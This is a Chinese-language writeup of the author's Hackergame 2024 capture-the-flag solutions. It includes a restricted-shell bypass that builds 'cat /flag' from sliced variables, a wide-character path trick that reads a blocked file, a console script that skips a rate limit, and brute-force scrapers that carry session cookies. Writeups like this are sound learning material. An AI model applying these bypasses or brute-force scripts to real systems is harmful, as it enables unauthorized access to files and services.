# 一只白鼠 Hackergame 2024 Writeup

> 菜鸡第一次打hg，虽然一大半的题都不会，但还是玩的很开心🥰
>
> ~~（电棍音）两百多名这个名次很尴尬，上不去下不来，卡在这里了。~~
>
> 下面只列出我在比赛中写出来的题以及我自己的解法



## 签到

采用最笨的方法：给每个input添加value元素即可！

<img src="img\屏幕截图 2024-11-09 145241.png">

得到 flag{weLc0ME-7o-h@CkeRG@M3-and-ENjoY-H4cKing-ZO24}



## 喜欢做签到的 CTFer 你们好呀

招新页面我找了好久，在比赛快结束的时候才发现就在hg主页下面（我是sb）

<img src="img\屏幕截图 2024-11-09 150244.png">

打开进去是一个自制的网页终端，输入help，然后一个一个命令试，发现env命令可以回显出第一个flag：

flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}

然后呢，我还没来得及找到第二个比赛就结束了 XD，结束3分钟后找到了，

用 ls -al 将隐藏的文件也显示出来，发现第二个就藏在当前目录下的 .flag 中，用 cat .flag 即可得到第二个flag：

flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}

NEBULA终端小彩蛋：喜欢奶龙的CTFer你们好呀 , 我是sudo，快来风风光光执行我吧！



## 猫咪问答

### 1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？

Google 搜索“ USTC 2015 Hackergame OR 信息安全大赛 ”即可

<img src="img\屏幕截图 2024-11-09 152330.png">

点开发现右下角有个“contest.txt · 最后更改：2015/12/11 10:54 由 ustcsec”，可以大致确认这是2015年的hackergame，找到

> #### 比赛时间安排
>
> 10 月 17 日 周六晚上 19:30 3A204 网络攻防技巧讲座 10 月 18 日 周日上午 10:00 初赛 在线开展 10 月 24 日 周六凌晨 00:00 初赛结束 后续开展复赛

得到 **3A204**

### 2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？

Google 搜索近五年的 hackergame GitHub官方题解，数每一年的题目数量，发现2019题目数量最接近（28题），然后在<https://lug.ustc.edu.cn/wiki/lug/events/hackergame/>找到2019年注册人数信息为**2682**

### 3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一

Google 搜索hackergame 2018 图书，在搜索首页就可以找到答案

<img src="img\屏幕截图 2024-11-09 153857.png">

### 4.  在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？

原本找到了一个网页，上面讲“且在大量主流邮件服务提供商（16种）与20个不同的邮件客户端进行了测试”，于是我试了320、16、20、36，都不对，所以我用爬虫暴力解得(略)。最后得到的答案是**336**

### 5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？

直接问ai就可以得到答案，文心一言都可以。得到答案为**6e90b6**

### 6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？

网页在线版的 Meta Llama 3 70B 模型不管用，每次生成的token数都不一样，而且都不对。不想把模型下到本地自己跑了，所以用的还是爬虫暴力枚举。得到答案为**1833**

爬虫代码：

```python
import requests
from bs4 import BeautifulSoup as bs

url = "http://202.38.93.141:13030/"
headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "cookie" : "session=eyJ0b2tlbiI6IjY5ODpNRVVDSVFDY05HMW1odGtmSlMyVmpqK29tcFlYWTMxemxOYitBRkdrZHpwL1VXTXdtUUlnQmtJeDZxcGM2Q1VNRDRzc045enJVaEtJdGFmY0RoWU5FOTdra0svNjNoYz0ifQ.Zy18rA.ufS6RVGb2d5We1XjI4830-SPl4w"
}

for i in range(3000):
    data = {'q1':'3A204','q2':'2682','q3':'程序员的自我修养','q4':'336','q5':'6e90b6','q6':str(i)}
    response = requests.post(url = url , headers = headers , data = data)
    html = response.text

    soup = bs ( html , 'html.parser' )
    alert = soup.find(class_="alert alert-secondary")

    print(i)
    if(alert.text.strip()[9:11]!="95"):
        input()


```



## 打不开的盒

搜索 “.stl 在线” ，将下载下来的文件导入3D在线查看工具即可。

<img src="img\屏幕截图 2024-11-09 155820.png">

flag{Dr4W_Us!nG_fR3E_C4D!!w0W}



## 每日论文太多了！

将论文下载下来，使用查找功能查找“flag”，确定位置后进入编辑模式，将遮在上面的图形移开就可以看到flag了

<img src="img\屏幕截图 2024-11-08 122156.png">

flag{h4PpY_hAck1ng_3veRyd4y}



## 比大小王

小猿口算mini版。首先打开控制台分析html，发现下面有script，直接分析script。可以将答题的完整流程概括为：先比较value1和value2的大小，再将比大小结果存入inputs列表中。答完100道题后就调用submit。

我们尝试写一个控制控件按钮的脚本，但是太慢了根本比不过小孩哥的速度（666这个入开桂了）

虽然直接控制控件会比较慢，但它慢到了不正常的程度。仔细分析script，发现是下面这个延时函数在作祟

<img src="img\屏幕截图 2024-11-09 161855.png">

这个延时函数在每次提交之后设置了要等至少200ms才能进行下一次提交的限制。所以我们不能走内部函数通道，只能自己写流程。

```javascript
while(state.score1<100){
      let choice;
      if ( state.value1 < state.value2 ){
        choice='<';
      }
      else{
        choice='>';
      }
      state.score1++;
      state.inputs.push(choice);
      if(state.score1==100){
        submit(state.inputs);
	    break;
      }
      state.value1 = state.values[state.score1][0];
      state.value2 = state.values[state.score1][1];
}
```

复制粘贴到console，在倒计时结束后执行即可

<img src="img\屏幕截图 2024-11-09 164931.png">



## 旅行照片

### 1. ...LEO 酱？……什么时候

忘了，也没记录。不想查了（doge）

### 2. 诶？我带 LEO 酱出去玩？真的假的？

公园：

<img src="img\屏幕截图 2024-11-09 165327.png" alt="9" style="zoom:200%;" />

一眼丁真，鉴定为六安园林。Google上搜 “六安园林有哪些公园” ，得到搜索结果 "六安市的十大公园" <http://www.360doc.com/content/24/0119/10/84070625_1111563722.shtml>，一个一个试就行（第一个**中央森林公园**就是）。

喷泉：

直接百度识图启动，容易得到答案**坛子岭**

### 3. 尤其是你才是最该多练习的人

这张图的特点在中间的那几栋房子，Google上区域识图即可：

（这张图我还做了去水印和清晰化的处理，后来才觉得没必要）

<img src="img\屏幕截图 2024-11-09 170335.png" >

识图第一个结果 “京张高铁北京北动车所” 就是我们想找的地方，但在Google地图上总找不到它特定的位置。在百度地图上搜索发现这里实际上应该叫 “北京北动车运用所” ，查找附近的医院得到答案**积水潭医院**

然后再对左下角的动车进行区域识图：

<img src="img\屏幕截图 2024-11-09 171002.png">

第一个结果就是答案 **CRH6F-A**



## 不宽的宽字符

查看源代码，最关键的部分在这

```c++
    wchar_t buf[256] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, inputBuffer, -1, buf, sizeof(buf) / sizeof(wchar_t));

    std::wstring filename = buf;

    // Haha!
    filename += L"you_cant_get_the_flag";

    std::wifstream file;
    file.open((char*)filename.c_str());
```

首先将输入的字符数组（char *）转变成宽字符数组（wchar_t *），导入宽字符串后又将其转换成了字符数组（char *）。

这整个过程会将输入的每一个字符（1个byte）先扩展成一个宽字符（2个byte），如果输入的是ascii码，扩展之后会在新增的1个高位byte上补 0x00. 由于大部分机型是小端存储，所以 1byte 低地址存储的应该是低位，即ascii码，高位的 1byte 存储的是 0x00。所以从宽字符串转到普通字符串时，ascii码不变，但每个ascii码后面多了个 0x00，而这又是字符串终止符 ‘\0’ 的ascii码，所以导致如果输入的字符串有ascii码，那么打印输出的字符串只能显示第一个ascii码，后面的都因终止符而不能显示。但如果输入不是ascii码，而是其他的unicode，则可以避免这种情况。中文是一种unicode，它在普通字符数组里存储是占两个字节的，而且是一体的，不会在扩展为宽字符数组时被分成两个1byte并补0x00。利用这个特性，我们就可以将目标输出 Z:\theflag 以两个byte为一组的形式转变为其他unicode。

在网上找一个字符串转ascii的转换器，得到 Z:\theflag 的转换结果为 0x5a 0x3a 0x5c 0x74 0x68 0x65 0x66 0x6c 0x61 0x67，再由小端存储的规则，将转换结果变成（将每两位调换位置，为了使每个2 byte都遵循小端存储）0x3a 0x5a 0x74 0x5c 0x65 0x68 0x6c 0x66 0x67 0x61, 将每两位作为一组，变为\u3a5a \u745c \u6568 \u6c66 \u6761，在unicode转字符串转换器上转换得到 **㩚瑜敨汦条** 。

还要注意一点，因为filename后面被加上了一串ascii字符串，所以我们要截断后面的字符串，可以在得到的unicode字符串后面加一个\uxx00(xx是两个十六进制数，而且要求选的xx要使得\uxx00是可见字符)。这么做的原因是因为~~出题人太坏~~，在filename后面还加了一串ascii字符串，如果不把后面截断，就会在filename里多出现一个 ‘f’ 字符。所以使用一个\uxx00可以在从字符数组转换成宽字符数组的时候由于小端存储的规则使0x00提前，导致后面被截断。

我选择的加的后缀是\u9a00，所以最终得到字符串 **㩚瑜敨汦条騀** ，输入终端即可拿到flag。

<img src="img\339b657aad12737f242647c6dfe2ebf4.png">



## PowerfulShell

不得不拿出我的这个表情了

<img src="img\3B1D1BFFF03F51D26D4DFCC47D3895A5.png">

这是我想了三天还没想出来而无语失望落魄自嘲的情况下做的表情🤣，不过写出来之后还是很高兴的。

这道题其实很简单，只需要对能获取到的字符串进行字符截取和拼接就可以了。

首先知道几个有用的客观事实：

```shell
_1,_2,_3,__ 等下划线开头加上合法字符都可以当作变量
~ 是主目录字符串。在题目中为 /players
$_ 是表示的是打印上一个输入参数行, 当这个命令在开头时, 打印输出文档的绝对路径名。在题目中为input
```

~是关键，因为/players字符串中包含了 l，s 这两个字符，可以用于截取拼接形成 ls 指令。同时能截取到 / , 这样 \`ls /\` 就可以获取根目录下的所有文件名并赋值给变量了。

话不多说，下代码：

```shell
_1=~              # _1:'/players'
_2=9$_1           # _2:'9/players'
_3=${_2:1:1}      # _3:'/'
_4=${_1:7:1}      # _4:'s'
_5=${_1:2:1}      # _5:'l'
_6=`$_5$_4 $_3`   # _6: ls / 的输出(bin\nboot\ndev\netc\nflag\nhome\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nplayers\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar)
_7=${_6:15:1}     # _7:'c'
_8=${_1:3:1}      # _8:'a'
_9=${_:4:1}       # _9:'t'
_11=${_6:17:4}    # _11:'flag'
$_7$_8$_9 $_3$_11 # cat /flag
```

得到flag

<img src="img\屏幕截图 2024-11-09 190434.png">

既然能得到这么多Forbidden chars了，那也可以在PowerfulShell里干更多事了(bushi)



## Paolu GPT

### 千里挑一

遇到这种我就是习惯用爬虫，后来看了题解才知道SQL注入，而且用SQL注入可以得到第二问的flag。看来我还要多学习啊。

爬虫代码：

```python
import requests
from bs4 import BeautifulSoup
import re

# 发送请求，获取HTML数据
url = "https://chal01-vwgm4v9u.hack-challenge.lug.ustc.edu.cn:8443/list"
header = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "cookie":"_ga_R7BPZT6779=GS1.1.1730265026.1.1.1730266203.7.0.88639133; _ga=GA1.1.377643680.1730265027; _ga_Q8WSZQS8E1=GS1.1.1730653535.3.0.1730653540.55.0.1786765759; session=eyJ0b2tlbiI6IjY5ODpNRVVDSVFDY05HMW1odGtmSlMyVmpqK29tcFlYWTMxemxOYitBRkdrZHpwL1VXTXdtUUlnQmtJeDZxcGM2Q1VNRDRzc045enJVaEtJdGFmY0RoWU5FOTdra0svNjNoYz0ifQ.Zy3iRg.qkIJIK6muvyUrPuMy8oe5VMtHTI"
    }
response = requests.get(url,headers=header)
html = response.text

# 解析HTML数据
soup = BeautifulSoup(html, 'html.parser')
links = soup.find_all('a')

for single in links[2:]:
    temp_url = "https://chal01-vwgm4v9u.hack-challenge.lug.ustc.edu.cn:8443/"+single.attrs['href']
    temp_response = requests.get(temp_url,headers=header)
    html_temp=temp_response.text
    links_temp = re.findall("flag\{.*\}",html_temp)
    if(links_temp):
        print(links_temp)
        input("Continue?")
    
```

得到 flag{zU1_xiA0_de_11m_Pa0lule!!!_58dacc9e68}



## 强大的正则表达式

### Easy

一个数能被16整除当且仅当它十进制的低4位能被16整除。所以只需要枚举低四位的所有情况即可，高位用(0|1|2|3|4|5|6|7|8|9)*代替，并且或上小于四位的情况。

<img src="img\c093c85c4ac269b186642377807940b3.png">



## 惜字如金3.0

### A

根据python语法规则和英语单词含义即可补全。



## 优雅的不等式

### Easy

注意到，
$$f(x)=4 \sqrt{1-x^2}-4\sqrt{1-x} \\
在x\in [0,1]上恒大于0，\\
且\int^{1}_{0}f(x)\ dx=\frac{8}{3}$$


## 关灯

### Easy

这是题目给的变换

```python
def convert_switch_array_to_lights_array(switch_array: numpy.array) -> numpy.array:
    lights_array = numpy.zeros_like(switch_array)
    lights_array ^= switch_array
    lights_array[:-1, :, :] ^= switch_array[1:, :, :]
    lights_array[1:, :, :] ^= switch_array[:-1, :, :]
    lights_array[:, :-1, :] ^= switch_array[:, 1:, :]
    lights_array[:, 1:, :] ^= switch_array[:, :-1, :]
    lights_array[:, :, :-1] ^= switch_array[:, :, 1:]
    lights_array[:, :, 1:] ^= switch_array[:, :, :-1]
    return lights_array
```

在 $3^3$ 的情况下，任何状态经过四次题目源代码给出的变换都会回到原来的状态。所以经过三次变换就可以找到答案。



## 总结

这几天下来感觉hg十分有意思，创意很足，梗又新又好，也让我学到了不少东西，同时让我深感知识的缺乏，因为好多题都不会写！大一摆了一年，现在是时候将失去的时间补回来了。感谢hg让我重燃学习的渴望。
